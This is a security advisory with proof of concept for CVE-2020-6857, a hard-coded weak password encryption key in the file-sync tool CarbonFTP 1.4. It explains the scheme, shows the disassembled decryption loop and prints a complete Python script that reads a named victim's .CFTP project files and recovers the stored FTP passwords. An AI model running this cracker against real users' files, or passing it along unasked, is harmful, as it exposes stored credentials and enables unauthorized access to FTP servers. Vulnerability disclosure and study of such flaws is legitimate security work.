@@ -1,0 +1,401 @@
+# Exploit Title: NEOWISE CARBONFTP 1.4 - Weak Password Encryption
+# discovery Date: 2019-01-24
+# published : 2020-01-20
+# Exploit Author: hyp3rlinx
+# Vendor Homepage: https://www.neowise.com
+# Software Link: https://www.neowise.com/freeware/
+# Version: 1.4
+
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/NEOWISE-CARBONFTP-v1.4-INSECURE-PROPRIETARY-PASSWORD-ENCRYPTION.txt
+[+] twitter.com/hyp3rlinx
+[+] ISR: ApparitionSec
+ 
+
+[Vendor]
+www.neowise.com
+
+
+[Product]
+CarbonFTP v1.4
+
+CarbonFTP is a file synchronization tool that enables you to synch local files with a remote FTP server and vice versa.
+It provides a step-by-step wizard to select the folders to be synchronized, the direction of the synchronization and option
+to set file masks to limit the transfer to specific file types. Your settings can be saved as projects, so they can be
+quickly re-used later.
+
+Download: https://www.neowise.com/freeware/
+Hash: 7afb242f13a9c119a17fe66c6f00a1c8
+
+
+[Vulnerability Type]
+Insecure Proprietary Password Encryption
+
+
+[CVE Reference]
+CVE-2020-6857
+
+
+[Affected Component]
+Password Encryption
+
+
+[Impact Escalation of Privileges]
+true
+
+
+[Impact Information Disclosure]
+true
+
+
+[Security Issue]
+CarbonFTP v1.4 uses insecure proprietary password encryption with a hard-coded weak encryption key.
+The key for locally stored FTP server passwords is hard-coded in the binary. Passwords encoded as hex
+are coverted to decimal which is then computed by adding the key "97F" to the result. The key 97F seems
+to be the same for all executables across all systems. Finally, passwords are stored as decimal values.
+
+If a user chooses to save the project the passwords are stored in ".CFTP" local configuration files.
+They can be found under "C:\Users\<VICTIM>\AppData\Roaming\Neowise\CarbonFTPProjects".
+
+e.g.
+
+Password=STRING|"2086721956209392195620939"
+
+Observing some very short password examples we see interesting patterns:
+
+27264 27360 27360 27360 27360    =   a
+27520 27617 27617 27617 27617    =   b
+27266 27616 27360 27361 27616    =   aab
+27521 27616 27616 27616 27616    =   ba
+
+Password encryption/decryption is as follows.
+
+Encryption process example.
+484C as decimal is the value 18508
+97F hex to decimal is the value 2431 (encrypt key)
+18508 + 2431 = 20939, the value 20939 would then represent the ascii characters "HL".
+
+To decrypt we just perform the reverse of the operation above.
+20939 - 2431 = 18508
+Next, convert the decimal value 18508 to hex and we get 484C.
+Finally, convert the hex value 484C to ascii to retrieve the plaintext password of "HL".
+
+CarbonFTP passwords less than nine characters are padded using chars from the current password up until
+reaching a password length of nine bytes.
+
+The two char password "XY" in encrypted form "2496125048250482504825048" is padded with "XY" until reaching a length
+of nine bytes "XYXYXYXYX".
+
+Similarly, the password "HELL" is "2086721956209392195620939" and again is padded since its length is less than nine bytes. 
+
+Therefore, we will get several cracked password candidates like: "HELLHELL | HELLHEL | HELLH | HELL | HEL | HE | HELLHELLH"
+However, the longer the password the easier it becomes to crack them, as we can decrypt passwords in one
+shot without having several candidates to choose from with one of them being the correct password.
+
+Therefore, "LOOOOONGPASSWORD!" is stored as the encrypted string "219042273422734224782298223744247862350210947"
+and because it is greater than nine bytes it is cracked without any candidate passwords returned.
+
+From offset 0047DA6F to 0047DAA0 is the loop that performs the password decryption process.
+Using the same password "HELL" as example.
+
+BPX @47DA6F
+
+0047DA6F | 8D 45 F0                 | lea eax,dword ptr ss:[ebp-10]                   |
+0047DA72 | 50                       | push eax                                        |
+0047DA73 | B9 05 00 00 00           | mov ecx,5                                       |
+0047DA78 | 8B D3                    | mov edx,ebx                                     |
+0047DA7A | 8B 45 FC                 | mov eax,dword ptr ss:[ebp-4]                    | [ebp-4]:"2086721956209392195620939"
+0047DA7D | E8 F6 6B F8 FF           | call carbonftp.404678                           |
+0047DA82 | 83 C3 05                 | add ebx,5                                       |
+0047DA85 | 8B 45 F0                 | mov eax,dword ptr ss:[ebp-10]                   | [ebp-10]:"20867"
+0047DA88 | E8 AF AD F8 FF           | call carbonftp.40883C                           |
+0047DA8D | 2B 45 F8                 | sub eax,dword ptr ss:[ebp-8]                    | ;<======= BOOOM ENCRYPT/DECRYPT KEY 97F IN DECIMAL ITS 2431
+0047DA90 | 66 89 06                 | mov word ptr ds:[esi],ax                        |
+0047DA93 | 83 C6 02                 | add esi,2                                       |
+0047DA96 | 8B 45 FC                 | mov eax,dword ptr ss:[ebp-4]                    | [ebp-4]:"2086721956209392195620939"
+0047DA99 | E8 7A 69 F8 FF           | call carbonftp.404418                           |
+0047DA9E | 3B D8                    | cmp ebx,eax                                     |
+0047DAA0 | 7E CD                    | jle carbonftp.47DA6F                            |
+
+
+Ok, simple explanation after SetBPX in 47DA88...
+
+At offset 0047DA8D,  97F is subtracted at [ebp-8] local variable which equals the decimal value 2431 (hex 97F)
+we also see EAX holds the value 55C4
+sub eax,dword ptr ss:[ebp-8]              
+therefore, 55C4 – 97F = 4C45            <======= ENCRYPT/DECRYPT KEY PROCESS.
+mov word ptr ds:[esi],ax
+add esi, 2  which is 4C45 + 2 = 4C47    <===== THEN
+
+Given a two letter combination like "HL":
+484C as decimal is 18508
+97F hex to decimal is 2431
+18508 + 2431 = 20939 = "HL"
+
+Done!
+
+
+[Exploit/POC]
+"CarbonFTPExploit.py"
+
+import time, string, sys, argparse, os
+from pkgutil import iter_modules
+
+#Sample test password 
+#LOOOOONGPASSWORD! = 219042273422734224782298223744247862350210947 
+
+key="97F"  #2431 in decimal, the weak hardcoded encryption key within the vuln program.
+chunk_sz=5 #number of bytes we must decrypt the password by.
+
+#Password is stored here:
+#C:\Users\<VICTIM>\AppData\Roaming\Neowise\CarbonFTPProjects\<FILE>.CFTP
+
+#Neowise CarbonFTP v1.4
+#Insecure Proprietary Password Encryption
+#By John Page (aka hyp3rlinx)
+#Apparition Security
+#===================================================
+
+def carbonftp_conf(conf_file):
+    p=""
+    pipe=-1
+    passwd=""
+    lst_of_passwds=[]
+    try:
+        for p in conf_file: 
+            idx = p.find("Password=STRING|")
+            if idx != -1:
+                pipe = p.find("|")
+                if pipe != -1:
+                    passwd = p[pipe + 2: -2]
+                    print(" Password found: "+ passwd)
+                    lst_of_passwds.append(passwd) 
+    except Exception as e:
+        print(str(e))
+    return lst_of_passwds 
+    
+
+def reorder(lst):
+    k=1
+    j=0
+    for n in range(len(lst)):
+        k+=1
+        j+=1
+        try:
+            tmp = lst[n+k]
+            a = lst[n+j]
+            lst[n+j] = tmp
+            lst[n+k] = a
+        except Exception as e:
+            pass
+    return ''.join(lst)
+
+
+def dec2hex(dec):
+    tmp = str(hex(int(dec)))
+    return str(tmp[2:])
+
+
+def hex2ascii(h):
+    h=h.strip()
+    try:
+        hex_val = h.decode("hex")
+    except Exception as e:
+        print("[!] Not a valid hex string.")
+        exit()
+    filtered_str = filter(lambda s: s in string.printable, hex_val)
+    return filtered_str
+
+
+def chunk_passwd(passwd_lst):
+    lst = []
+    for passwd in passwd_lst:
+        while passwd:
+            lst.append(passwd[:chunk_sz])
+            passwd = passwd[chunk_sz:]
+    return lst
+
+
+cnt = 0
+passwd_str=""
+def deob(c):
+    
+    global cnt, passwd_str
+
+    tmp=""
+
+    try:
+        tmp = int(c) - int(key, 16)
+        tmp = dec2hex(tmp)
+    except Exception as e:
+        print("[!] Not a valid CarbonFTP encrypted password.")
+        exit()
+
+    b=""
+    a=""
+
+     #Seems we can delete the second char as its most always junk.
+    if cnt!=1:
+        a = tmp[:2]
+        cnt+=1
+    else:
+        b = tmp[:4]
+
+    passwd_str += hex2ascii(a + b)
+        
+    hex_passwd_lst = list(passwd_str)
+    return hex_passwd_lst
+
+
+def no_unique_chars(lst):
+    c=0
+    k=1
+    j=0
+    for i in range(len(lst)):
+        k+=1
+        j+=1
+        try:
+            a = lst[i]
+            b = lst[i+1]
+            if a != b:
+                c+=1
+            elif c==0:
+                print("[!] Possible one char password?: " +str(lst[0]))
+                return lst[0]
+        except Exception as e:
+            pass
+    return False
+
+
+def decryptor(result_lst):
+
+    global passwd_str, sz
+
+    final_carbon_passwd=""
+
+    print(" Decrypting ... \n")
+    for i in result_lst:
+        print("[-] "+i)
+        time.sleep(0.1)
+        lst = deob(i)
+
+    #Re-order chars to correct sequence using custom swap function (reorder).
+    reordered_pass = reorder(lst)
+    sz = len(reordered_pass)
+
+    #Flag possible single char password.
+    no_unique_chars(lst)
+    
+    print("[+] PASSWORD LENGTH: " + str(sz))
+    if sz == 9:
+        return (reordered_pass[:-1] + " | " + reordered_pass[:-2] + " | " + reordered_pass[:-4] + " | " +
+                reordered_pass[:-5] +" | " + reordered_pass[:-6] + " | "+ reordered_pass[:-7] + " | " + reordered_pass)
+    
+    #Shorter passwords less then nine chars will have several candidates
+    #as they get padded with repeating chars so we return those.
+        
+    passwd_str=""
+    return reordered_pass
+
+
+def display_cracked_passwd(sz, passwd):
+    if sz==9:
+        print("[*] PASSWORD CANDIDATES: "+ passwd + "\n")
+    else:
+        print("[*] DECRYPTED PASSWORD: "+passwd + "\n")
+
+
+def parse_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-u", "--user", help="Username to crack a directory of Carbon .CFTP password files")
+    parser.add_argument("-p", "--encrypted_password", help="Crack a single encrypted password")
+    return parser.parse_args()
+
+
+def main(args):
+
+    global passwd_str, sz
+    victim=""
+
+    if args.user and args.encrypted_password:
+        print("[!] Supply a victims username -u or single encrypted password -p, not both.")
+        exit()
+
+    print("[+] Neowise CarbonFTP v1.4")
+    time.sleep(0.1)
+    print("[+] CVE-2020-6857 Insecure Proprietary Password Encryption")
+    time.sleep(0.1)
+    print("[+] Discovered and cracked by hyp3rlinx")
+    time.sleep(0.1)
+    print("[+] ApparitionSec\n")
+    time.sleep(1)
+
+    #Crack a dir of carbonFTP conf files containing encrypted passwords -u flag.
+    if args.user:
+        victim = args.user
+        os.chdir("C:/Users/"+victim+"/AppData/Roaming/Neowise/CarbonFTPProjects/")
+        dir_lst = os.listdir(".")
+        for c in dir_lst:
+            f=open("C:/Users/"+victim+"/AppData/Roaming/Neowise/CarbonFTPProjects/"+c, "r")
+            #Get encrypted password from conf file
+            passwd_enc = carbonftp_conf(f)
+            #Break up into 5 byte chunks as processed by the proprietary decryption routine.
+            result_lst = chunk_passwd(passwd_enc)
+            #Decrypt the 5 byte chunks and reassemble to the cleartext password.
+            cracked_passwd = decryptor(result_lst)
+            #Print cracked password or candidates.
+            display_cracked_passwd(sz, cracked_passwd)
+            time.sleep(0.3)
+            passwd_str=""
+            f.close()
+
+
+    #Crack a single password -p flag.
+    if args.encrypted_password:
+        passwd_to_crack_lst = []
+        passwd_to_crack_lst.append(args.encrypted_password)
+        result = chunk_passwd(passwd_to_crack_lst)
+        #Print cracked password or candidates.
+        cracked_passwd = decryptor(result)
+        display_cracked_passwd(sz, cracked_passwd)
+
+
+if __name__=="__main__":
+
+    parser = argparse.ArgumentParser()
+
+    if len(sys.argv)==1:
+        parser.print_help(sys.stderr)
+        exit()
+
+    main(parse_args())
+
+[POC Video URL]
+https://www.youtube.com/watch?v=q9LMvAl6LfE
+
+
+[Network Access]
+Local
+
+
+[Severity]
+High
+
+
+[Disclosure Timeline]
+Vendor Notification: Website contact form not working, several attempts : January 12, 2020
+CVE Assigned by mitre : January 13, 2020
+January 20, 2020 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
